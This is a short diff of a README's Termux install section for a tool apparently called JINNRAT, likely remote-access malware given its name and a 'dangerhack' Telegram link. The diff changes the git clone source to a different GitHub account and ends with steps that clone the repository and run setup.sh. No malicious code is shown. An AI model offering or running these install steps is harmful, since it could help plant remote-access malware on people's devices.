@@ -47,9 +47,7 @@ https://t.me/dangerhack56
 ---
 
 ### install setup Termux
-
-```
-git clone https://github.com/Saqibca/JINNRAT
+git clone https://github.com/alvinbaby/JINNRAT
 cd JINNRAT
 bash setup.sh
 ```
